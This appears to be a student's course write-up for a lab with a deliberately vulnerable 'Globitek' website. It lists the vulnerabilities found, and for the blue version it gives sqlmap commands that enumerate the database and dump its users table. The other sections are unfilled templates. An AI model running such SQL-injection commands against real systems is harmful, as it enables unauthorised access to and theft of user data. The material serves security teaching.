# Cybersecurity_week8

Six possible vulnerabilities:
[x] Username Enumeration
[x] Insecure Direct Object Reference
[x] SQL Injection
[x] Cross-Site Scripting
[ ] Cross-Site Request Forgery
[ ] Session Hijacking/Fixation
Vulnerabilities I found and exploited:
* Username Enumeration
* Insecure Direct Object Reference
* SQL Injection
* Cross-Site Scripting
* Bonus Objective 1:
  * Build on the SQL Injection vulnerbility. Experiment to see what other kinds of information one can get the database to reveal.
  
**Blue** version of Globitek website 
**Vulnerability 1:** SQL Injection
  * **Steps:**
    1. use command: 'sqlmap -u "https://35.184.168.159/blue/public/salesperson.php?id=1" --current-db' to retrieve the database the website is currently using (which is "globitek_blue")
    2. use command: 'sqlmap -u "https://35.184.168.159/blue/public/salesperson.php?id=1" -D globitek_blue --tables' to retrieve all of the tables that is in the database
    3. use command: ''sqlmap -u "https://35.184.168.159/blue/public/salesperson.php?id=1" --dump -D globitek_blue -T users' to retrieve all users' information
  * **GIF walkthrough:**
    * ![sqli](https://user-images.githubusercontent.com/31838335/39098942-fed0c51e-463f-11e8-82c4-e410750e79d1.gif)
    
**Green** version of Globitek website 
**Vulnerability 1:** SQL Injection
  * **Steps:**
    1. 
    2. 
    3. 
  * **GIF walkthrough:**
    * 
**Vulnerability 2:** SQL Injection
  * **Steps:**
    1. 
    2. 
    3. 
  * **GIF walkthrough:**
    * 
**Red** version of Globitek website 
**Vulnerability 1:** SQL Injection
  * **Steps:**
    1. 
    2. 
    3. 
  * **GIF walkthrough:**
    * 
** Bonus Objective 1: **
  * **Steps:**
    1. 
    2. 
    3. 
  * **GIF walkthrough:**
    * 
